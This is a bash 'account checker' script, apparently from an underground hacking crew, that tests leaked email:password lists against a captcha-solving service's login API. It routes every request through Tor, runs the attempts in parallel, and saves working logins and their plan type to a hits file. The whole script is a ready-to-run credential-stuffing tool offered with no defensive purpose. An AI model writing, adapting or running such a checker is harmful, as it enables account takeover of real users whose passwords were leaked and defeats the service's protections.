#!/bin/bash
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
PUTIH='\033[1;37m'
echo -e "\e[38;5;206m"
echo -e "\e[1m"
cat << "EOF"
        ---------------------------------------------------------
                        o   o                    o
                         \ /                     |
                          O    oo o  o o-o  o-o -o-
                         / \  | | |  | |  | |-'  |
                        o   o o-o-o--O o  o o-o  o
                                     |
                                  o--o / Deatchbycaptcha Account Checker
                                  Rewrite: mtezy
                                  
        ---------------------------------------------------------
 
EOF
 
printf "\e[38;5;50m"
cat << "thanks"
         Thanks : Extreme Crew - ccoocoot ccoocot
                  XAYNET - SGBTeam - Rumah Sakit Jiwa
                  
                  
thanks

ngecek() {
    res1=$(date +%s)
    start_date=$(date +%H:%M:%S)
    extract=$(echo ${1} | cut -d@ -f1)
    postdata="{\"action\":\"loginAction\",\"fields\":{\"userLoginId\":\"${1}\",\"rememberMe\":\"true\",\"password\":\"${2}\"},\"verb\":\"POST\",\"mode\":\"login\",\"flow\":\"appleSignUp\"}"
	#cokjancok=$(curl -s "https://bo.doku.com/v2/" -i)
    # auth=$(echo "$cokjancok" | grep clientToken | grep -Po '(?<=value=")[^;]*' | cut -d '"' -f1)
 #  fetchCookie=$(echo "$cokjancok" | grep -Po '(?<=Set-Cookie:)[^;]*')
   #cookie=$(echo $cokjancok | grep -Po '(?<=JSESSIONID=)[^;]*')
     login=$(curl -s --socks5 127.0.0.1:9050 "https://securenetconnection.com/clapi/v1.5/user/login" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" \
  -H "Pragma: no-cache" \
  -H "Accept: */*" \
  -d "username=${1}&password=${2}")
     loc=$(echo "$login" | grep -Po '(?<="code":)[^,]*')
     plan=$(echo "$login" | grep -Po '(?<="plan":")[^,]*')
     #csrfToken=$(echo "$getPage" | grep -Po '(?<=tokenCSRF =)[^;]*' | tr -d "'" | sort -u)
	if [ -z "$plan" ]; then
      printf "${NOCOLOR}[$i/$totalLines]${RED}[DIE] => $1:$2${NC} \n"
     else
	printf "${NOCOLOR}[$i/$totalLines]${GREEN} INFO : $1:$2\n"
	echo "$1:$2 $plan" >> hmaaacount.txt
	fi
	
}  
	

echo "List In This Directory : "
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    echo "[+] Calculate your mailist file"
    echo "############################"
    totalLines=`grep -c ":" $list`
    echo "There are $totalLines of list."
    echo "############################"
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
    index=$((itung++))
    if [[ $(expr ${i} % ${itung}) == 0 && $i > 0 ]]; then
    percentage=$((100*$i/$totalLines))
    wait
    fi
        emailna="${emailgblg[$i]}"
        kontol="${passwordna[$i]}"

        ngecek "$emailna" "$kontol" "$index" &
    done
    wait
    